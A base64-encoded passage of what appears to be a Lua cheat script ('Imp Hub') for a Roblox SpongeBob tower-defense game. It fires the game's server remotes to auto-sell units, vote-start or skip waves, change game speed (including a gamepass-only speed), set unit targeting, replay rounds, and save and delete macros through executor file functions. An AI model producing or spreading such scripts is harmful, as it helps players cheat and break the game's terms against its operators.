IKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKTpXYWl0Rm9yQ2hpbGQoImtuaXQiKTpXYWl0Rm9yQ2hpbGQoIlNlcnZpY2VzIik6V2FpdEZvckNoaWxkKCJUb3dlclNlcnZpY2UiKTpXYWl0Rm9yQ2hpbGQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiUkYiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICk6V2FpdEZvckNoaWxkKCJVbnN1YnNjcmliZUZyb21Ub3dlciIpOkludm9rZVNlcnZlcih2OkdldEF0dHJpYnV0ZSgiSWQiKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9CikKClRhYnMuR2FtZTpBZGRUb2dnbGUoCiAgICAib3Blbmd1aW9udXBnIiwKICAgIHsKICAgICAgICBUaXRsZSA9ICJPcGVuIFVwZ3JhZGUgR3VpIE9uIFVwZ3JhZGUiLAogICAgICAgIERlc2NyaXB0aW9uID0gIi0gVGhpcyBXaWxsIE9wZW4gVGhlIFVwZ3JhZGUgR3VpIE9mIFRoZSBVcGdyYWRlZCBVbml0IiwKICAgICAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0KQogICAgICAgICAgICBvcGVuZ3Vpb251cGcgPSB0CiAgICAgICAgZW5kCiAgICB9CikKClRhYnMuR2FtZTpBZGRUb2dnbGUoCiAgICAidXBnb24iLAogICAgewogICAgICAgIFRpdGxlID0gIk5vdGlmeSBPbiBVbml0IFVwZ3JhZGVkIiwKICAgICAgICBEZXNjcmlwdGlvbiA9ICItIFRoaXMgV2lsbCBTZW5kIEEgVUkgTm90aWZ5IEV2ZXJ5dGltZSBBIFVuaXQgR2V0J3MgVXBncmFkZWQiLAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHQpCiAgICAgICAgICAgIHVwZ29uID0gdAogICAgICAgIGVuZAogICAgfQopCgpUYWJzLkdhbWU6QWRkU2VjdGlvbigiU2VsbCBVbml0cyDwn4+3IikKClRhYnMuR2FtZTpBZGRJbnB1dCgKICAgICJ3YXZlc2VsbCIsCiAgICB7CiAgICAgICAgVGl0bGUgPSAiV2F2ZSIsCiAgICAgICAgRGVmYXVsdCA9ICIxIiwKICAgICAgICBQbGFjZWhvbGRlciA9ICIuLi4iLAogICAgICAgIE51bWVyaWMgPSBmYWxzZSwKICAgICAgICBGaW5pc2hlZCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odCkKICAgICAgICAgICAgd2F2ZXNlbGwgPSB0b251bWJlcih0KQogICAgICAgIGVuZAogICAgfQopCgpUYWJzLkdhbWU6QWRkVG9nZ2xlKAogICAgInNlbGxvbndhdmUiLAogICAgewogICAgICAgIFRpdGxlID0gIlNlbGwgT24gV2F2ZSIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiLSBUaGlzIFdpbGwgU2VsbCBBbGwgWW91ciBVbml0cyBPbiBUaGUgU2V0IFdhdmUiLAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHQpCiAgICAgICAgICAgIHNlbGxvbndhdmUgPSB0CiAgICAgICAgICAgIHdoaWxlIHNlbGxvbndhdmUgZG8KICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICBwY2FsbCgKICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b251bWJlcigKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuR2FtZVVJLlRvcC5NYWluLlN0YWdlSW5mby5GcmFtZS5DdXJyZW50V2F2ZS5UZXh0OmdzdWIoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIlRCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKSA9PSB3YXZlc2VsbAogICAgICAgICAgICAgICAgICAgICAgICAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgiUGFja2FnZXMiKTpXYWl0Rm9yQ2hpbGQoIl9JbmRleCIpOldhaXRGb3JDaGlsZCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAic2xlaXRuaWNrX2tuaXRAMS43LjAiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApOldhaXRGb3JDaGlsZCgia25pdCIpOldhaXRGb3JDaGlsZCgiU2VydmljZXMiKTpXYWl0Rm9yQ2hpbGQoIlRvd2VyU2VydmljZSIpOldhaXRGb3JDaGlsZCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiUkYiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApOldhaXRGb3JDaGlsZCgiU2VsbEFsbFRvd2VycyIpOkludm9rZVNlcnZlcigpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5HYW1lOkFkZFRvZ2dsZSgKICAgICJsZWF2ZW9ud2F2ZSIsCiAgICB7CiAgICAgICAgVGl0bGUgPSAiTGVhdmUgT24gV2F2ZSIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiLSBUaGlzIFdpbGwgVGVsZXBvcnQgWW91IFRvIExvYmJ5IE9uIFJlYWNoZWQgV2F2ZSIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odCkKICAgICAgICAgICAgbGVhdmVvbndhdmUgPSB0CiAgICAgICAgICAgIHdoaWxlIGxlYXZlb253YXZlIGRvCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgcGNhbGwoCiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBpZgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9udW1iZXIoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuUGxheWVyR3VpLkdhbWVVSS5Ub3AuTWFpbi5TdGFnZUluZm8uRnJhbWUuQ3VycmVudFdhdmUuVGV4dDpnc3ViKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiJUQiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICkgPT0gd2F2ZXNlbGwKICAgICAgICAgICAgICAgICAgICAgICAgIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRlbGVwb3J0VG9Mb2JieSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRmx1ZW50Ok5vdGlmeSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRpdGxlID0gIkltcCBIdWIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb250ZW50ID0gIsKhUmVhY2hlZCBXYXZlISIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN1YkNvbnRlbnQgPSAiVGVsZXBvcnRpbmcgVG8gTG9iYnkuLi4iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5HYW1lOkFkZEJ1dHRvbigKICAgIHsKICAgICAgICBUaXRsZSA9ICJTZWxsIEFsbCBVbml0cyIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiLSBXaWxsIFNlbGwgQWxsIFlvdXIgUGxhY2VkIFVuaXRzIiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgiUGFja2FnZXMiKTpXYWl0Rm9yQ2hpbGQoIl9JbmRleCIpOldhaXRGb3JDaGlsZCgKICAgICAgICAgICAgICAgICJzbGVpdG5pY2tfa25pdEAxLjcuMCIKICAgICAgICAgICAgKTpXYWl0Rm9yQ2hpbGQoImtuaXQiKTpXYWl0Rm9yQ2hpbGQoIlNlcnZpY2VzIik6V2FpdEZvckNoaWxkKCJUb3dlclNlcnZpY2UiKTpXYWl0Rm9yQ2hpbGQoIlJGIik6V2FpdEZvckNoaWxkKAogICAgICAgICAgICAgICAgIlNlbGxBbGxUb3dlcnMiCiAgICAgICAgICAgICk6SW52b2tlU2VydmVyKCkKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5HYW1lOkFkZFNlY3Rpb24oIlVuaXRzIFByaW9yaXR5IPCfk7AiKQoKVGFicy5HYW1lOkFkZERyb3Bkb3duKAogICAgInByaW9yaXR5c2V0IiwKICAgIHsKICAgICAgICBUaXRsZSA9ICJQcmlvcml0eSIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiLSBQcmlvcml0eSBUbyBTZXQgWW91ciBVbml0cyBUbyIsCiAgICAgICAgVmFsdWVzID0geyJGaXJzdEluUmFuZ2UiLCAiTGFzdEluUmFuZ2UifSwKICAgICAgICBNdWx0aSA9IGZhbHNlLAogICAgICAgIERlZmF1bHQgPSAiIiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHQpCiAgICAgICAgICAgIHByaW9yaXR5c2V0ID0gdAogICAgICAgIGVuZAogICAgfQopCgpUYWJzLkdhbWU6QWRkVG9nZ2xlKAogICAgInNldHByaW9yaXR5IiwKICAgIHsKICAgICAgICBUaXRsZSA9ICJTZXQgUHJpb3JpdHkiLAogICAgICAgIERlc2NyaXB0aW9uID0gIi0gV2lsbCBTZXQgQWxsIFlvdXIgVW5pdHMgUHJpb3JpdHkgVG8gU2VsZWN0ZWQgUHJpb3JpdHkiLAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHQpCiAgICAgICAgICAgIHNldHByaW9yaXR5ID0gdAogICAgICAgICAgICB3aGlsZSBzZXRwcmlvcml0eSBkbwogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNikKICAgICAgICAgICAgICAgIHBjYWxsKAogICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGksIHYgaW4gaXBhaXJzKHdvcmtzcGFjZS5GcmllbmRsaWVzOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvc3RyaW5nKHY6R2V0QXR0cmlidXRlKCJPd25lcklkIikpID09IHRvc3RyaW5nKFBsci5Vc2VySWQpIGFuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2OkdldEF0dHJpYnV0ZSgiQXR0YWNrTW9kZSIpIH49IHByaW9yaXR5c2V0IGFuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmlvcml0eXNldCB+PSAiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6V2FpdEZvckNoaWxkKCJQYWNrYWdlcyIpOldhaXRGb3JDaGlsZCgiX0luZGV4Iik6V2FpdEZvckNoaWxkKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAic2xlaXRuaWNrX2tuaXRAMS43LjAiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKTpXYWl0Rm9yQ2hpbGQoImtuaXQiKTpXYWl0Rm9yQ2hpbGQoIlNlcnZpY2VzIik6V2FpdEZvckNoaWxkKCJHYW1lU2VydmljZSIpOldhaXRGb3JDaGlsZCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlJGIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICk6V2FpdEZvckNoaWxkKCJDaGFuZ2VUb3dlclRhcmdldE1vZGUiKTpJbnZva2VTZXJ2ZXIodjpHZXRBdHRyaWJ1dGUoIklkIiksIHByaW9yaXR5c2V0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5HYW1lOkFkZFNlY3Rpb24oIk1pc2Mg8J+TjiIpCgpUYWJzLkdhbWU6QWRkVG9nZ2xlKAogICAgInN0YXJ0IiwKICAgIHsKICAgICAgICBUaXRsZSA9ICJBdXRvbWF0aWMgVm90ZSBTdGFydCBHYW1lIiwKICAgICAgICBEZXNjcmlwdGlvbiA9ICItIFdpbGwgQXV0byBTdGFydCBHYW1lIiwKICAgICAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0KQogICAgICAgICAgICBzdGFydCA9IHQKICAgICAgICAgICAgd2hpbGUgc3RhcnQgZG8KICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICBwY2FsbCgKICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpXYWl0Rm9yQ2hpbGQoIlBhY2thZ2VzIik6V2FpdEZvckNoaWxkKCJfSW5kZXgiKTpXYWl0Rm9yQ2hpbGQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAic2xlaXRuaWNrX2tuaXRAMS43LjAiCiAgICAgICAgICAgICAgICAgICAgICAgICk6V2FpdEZvckNoaWxkKCJrbml0Iik6V2FpdEZvckNoaWxkKCJTZXJ2aWNlcyIpOldhaXRGb3JDaGlsZCgiR2FtZVNlcnZpY2UiKTpXYWl0Rm9yQ2hpbGQoIlJGIik6V2FpdEZvckNoaWxkKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlZvdGVTdGFydFJvdW5kIgogICAgICAgICAgICAgICAgICAgICAgICApOkludm9rZVNlcnZlcigpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfQopCgpUYWJzLkdhbWU6QWRkVG9nZ2xlKAogICAgInNraXAiLAogICAgewogICAgICAgIFRpdGxlID0gIkF1dG9tYXRpYyBTa2lwIFdhdmUiLAogICAgICAgIERlc2NyaXB0aW9uID0gIi0gV2lsbCBBdXRvIFNraXAgV2F2ZSIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odCkKICAgICAgICAgICAgc2tpcCA9IHQKICAgICAgICAgICAgd2hpbGUgc2tpcCBkbwogICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgICAgICAgICBwY2FsbCgKICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLlBsYXllckd1aS5Wb3RlU2tpcC5FbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpXYWl0Rm9yQ2hpbGQoIlBhY2thZ2VzIik6V2FpdEZvckNoaWxkKCJfSW5kZXgiKTpXYWl0Rm9yQ2hpbGQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInNsZWl0bmlja19rbml0QDEuNy4wIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgKTpXYWl0Rm9yQ2hpbGQoImtuaXQiKTpXYWl0Rm9yQ2hpbGQoIlNlcnZpY2VzIik6V2FpdEZvckNoaWxkKCJHYW1lU2VydmljZSIpOldhaXRGb3JDaGlsZCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiUkYiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApOldhaXRGb3JDaGlsZCgiVm90ZVNraXBSb3VuZCIpOkludm9rZVNlcnZlcigpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5HYW1lOkFkZFRvZ2dsZSgKICAgICJhdXRvc3BkIiwKICAgIHsKICAgICAgICBUaXRsZSA9ICJBdXRvbWF0aWMgU2V0IFNwZWVkIFtYMl0iLAogICAgICAgIERlc2NyaXB0aW9uID0gIi0gV2lsbCBBdXRvIFNldCBTcGVlZCBUbyBYMiIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odCkKICAgICAgICAgICAgYXV0b3NwZCA9IHQKICAgICAgICAgICAgd2hpbGUgYXV0b3NwZCBkbwogICAgICAgICAgICAgICAgdGFzay53YWl0KDMpCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6V2FpdEZvckNoaWxkKCJQYWNrYWdlcyIpOldhaXRGb3JDaGlsZCgiX0luZGV4Iik6V2FpdEZvckNoaWxkKAogICAgICAgICAgICAgICAgICAgICJzbGVpdG5pY2tfa25pdEAxLjcuMCIKICAgICAgICAgICAgICAgICk6V2FpdEZvckNoaWxkKCJrbml0Iik6V2FpdEZvckNoaWxkKCJTZXJ2aWNlcyIpOldhaXRGb3JDaGlsZCgiR2FtZVNlcnZpY2UiKTpXYWl0Rm9yQ2hpbGQoIlJGIik6V2FpdEZvckNoaWxkKAogICAgICAgICAgICAgICAgICAgICJDaGFuZ2VHYW1lU3BlZWQiCiAgICAgICAgICAgICAgICApOkludm9rZVNlcnZlcigyKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5HYW1lOkFkZFRvZ2dsZSgKICAgICJhdXRvc3BkdGhyZWUiLAogICAgewogICAgICAgIFRpdGxlID0gIkF1dG9tYXRpYyBTZXQgU3BlZWQgW1gzIEdhbWVwYXNzIFJlcXVpcmVkXSIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiLSBXaWxsIEF1dG8gU2V0IFNwZWVkIFRvIFgzIiwKICAgICAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0KQogICAgICAgICAgICBhdXRvc3BkdGhyZWUgPSB0CiAgICAgICAgICAgIHdoaWxlIGF1dG9zcGR0aHJlZSBkbwogICAgICAgICAgICAgICAgdGFzay53YWl0KDMpCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6V2FpdEZvckNoaWxkKCJQYWNrYWdlcyIpOldhaXRGb3JDaGlsZCgiX0luZGV4Iik6V2FpdEZvckNoaWxkKAogICAgICAgICAgICAgICAgICAgICJzbGVpdG5pY2tfa25pdEAxLjcuMCIKICAgICAgICAgICAgICAgICk6V2FpdEZvckNoaWxkKCJrbml0Iik6V2FpdEZvckNoaWxkKCJTZXJ2aWNlcyIpOldhaXRGb3JDaGlsZCgiR2FtZVNlcnZpY2UiKTpXYWl0Rm9yQ2hpbGQoIlJGIik6V2FpdEZvckNoaWxkKAogICAgICAgICAgICAgICAgICAgICJDaGFuZ2VHYW1lU3BlZWQiCiAgICAgICAgICAgICAgICApOkludm9rZVNlcnZlcigzKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5HYW1lOkFkZFNlY3Rpb24oIkZpbmlzaGVkIEdhbWUg8J+OrCIpCgpUYWJzLkdhbWU6QWRkVG9nZ2xlKAogICAgInJldHJ5IiwKICAgIHsKICAgICAgICBUaXRsZSA9ICJBdXRvbWF0aWMgUmVwbGF5IEdhbWUiLAogICAgICAgIERlc2NyaXB0aW9uID0gIi0gV2lsbCBSZXBsYXkgT24gRmluaXNoZWQgR2FtZSIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odCkKICAgICAgICAgICAgcmV0cnkgPSB0CiAgICAgICAgICAgIHdoaWxlIHJldHJ5IGRvCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC42KQogICAgICAgICAgICAgICAgcGNhbGwoCiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuUm91bmRTdW1tYXJ5LkVuYWJsZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xpY2tidXR0b24oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuUGxheWVyR3VpLlJvdW5kU3VtbWFyeS5NYWluLkNvbnRlbnQuQWN0aW9ucy5SZXBsYXkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfQopCgpUYWJzLkdhbWU6QWRkVG9nZ2xlKAogICAgIm5leHRkIiwKICAgIHsKICAgICAgICBUaXRsZSA9ICJBdXRvbWF0aWMgTmV4dCBHYW1lIiwKICAgICAgICBEZXNjcmlwdGlvbiA9ICItIFdpbGwgQ2xpY2sgTmV4dCBPbiBGaW5pc2hlZCBHYW1lIiwKICAgICAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0KQogICAgICAgICAgICBuZXh0ZCA9IHQKICAgICAgICAgICAgd2hpbGUgbmV4dGQgZG8KICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjYpCiAgICAgICAgICAgICAgICBwY2FsbCgKICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLlBsYXllckd1aS5Sb3VuZFN1bW1hcnkuRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGlja2J1dHRvbigKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuUm91bmRTdW1tYXJ5Lk1haW4uQ29udGVudC5BY3Rpb25zLk5leHQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfQopCgpUYWJzLkdhbWU6QWRkVG9nZ2xlKAogICAgImJhY2siLAogICAgewogICAgICAgIFRpdGxlID0gIkF1dG9tYXRpYyBCYWNrIFRvIExvYmJ5IiwKICAgICAgICBEZXNjcmlwdGlvbiA9ICItIFdpbGwgVGVsZXBvcnQgQmFjayBUbyBMb2JieSBPbiBGaW5pc2hlZCBHYW1lIiwKICAgICAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0KQogICAgICAgICAgICBiYWNrID0gdAogICAgICAgICAgICB3aGlsZSBiYWNrIGRvCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC42KQogICAgICAgICAgICAgICAgcGNhbGwoCiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuUm91bmRTdW1tYXJ5LkVuYWJsZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xpY2tidXR0b24oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuUGxheWVyR3VpLlJvdW5kU3VtbWFyeS5NYWluLkNvbnRlbnQuUmV0dXJuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5NYWluOkFkZFNlY3Rpb24oIkluZm9ybWF0aW9uIPCfk4siKQoKVGFicy5NYWluOkFkZFBhcmFncmFwaCgKICAgIHsKICAgICAgICBUaXRsZSA9ICJIb3cgVG8gVXNl4p2TIiwKICAgICAgICBDb250ZW50ID0gW1sKICAgIDEuLSBTZXQgTWFjcm8gTmFtZSwKICAgIDIuLSBUb2dnbGUgT24gUmVjb3JkLAogICAgMy4tIFdoZW4gSXQgSXMgRmluaXNoZWQsIFRvZ2dsZSBSZWNvcmQgT2ZmCiAgICAKICAgIDQuLSBTZWxlY3QgTWFjcm8sCiAgICA1Li0gVG9nZ2xlIE9uIFJlcGxheSBNYWNyby4KICAgIF1dCiAgICB9CikKClRhYnMuTWFpbjpBZGRQYXJhZ3JhcGgoCiAgICB7CiAgICAgICAgVGl0bGUgPSAiVGlwIOKblCIsCiAgICAgICAgQ29udGVudCA9IFtbCiAgICAtIERvbid0IFBsYWNlIFVuaXRzIFRvbyBDbG9zZS4KICAgIF1dCiAgICB9CikKClRhYnMuTWFpbjpBZGRTZWN0aW9uKCJTZXQgVXAgTWFjcm8g8J+TgiIpCgpsb2NhbCBtYWNyb2Ryb3AgPQogICAgVGFicy5NYWluOkFkZERyb3Bkb3duKAogICAgIk1hY3JvU2VsZWN0ZWQiLAogICAgewogICAgICAgIFRpdGxlID0gIlNlbGVjdCBNYWNybyIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiTWFjcm8gVG8gUmVwbGF5IiwKICAgICAgICBWYWx1ZXMgPSBGaWxlcywKICAgICAgICBNdWx0aSA9IGZhbHNlLAogICAgICAgIERlZmF1bHQgPSAiIiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHQpCiAgICAgICAgICAgIG1hY3JvID0gdAogICAgICAgIGVuZAogICAgfQopCgpUYWJzLk1haW46QWRkQnV0dG9uKAogICAgewogICAgICAgIFRpdGxlID0gIkRlbGV0ZSBNYWNybyBTZWxlY3RlZCIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiIiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgcGNhbGwoCiAgICAgICAgICAgICAgICBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgaWYgbWFjcm8gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBkZWxmaWxlKCJJbXAgSHViIiAuLiAiL1Nwb25nZWJvYlRELyIgLi4gbWFjcm8pCgogICAgICAgICAgICAgICAgICAgICAgICB0YWJsZS5jbGVhcihGaWxlcykKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGksIHYgaW4gcGFpcnMoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBIdHRwOkpTT05EZWNvZGUocmVhZGZpbGUoIkltcCBIdWIiIC4uICIvU3BvbmdlYm9iVEQvTWFjcm9zL1NhdmVkTWFjcm9zLmpzb24iKSkKICAgICAgICAgICAgICAgICAgICAgICAgKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaSB+PSBtY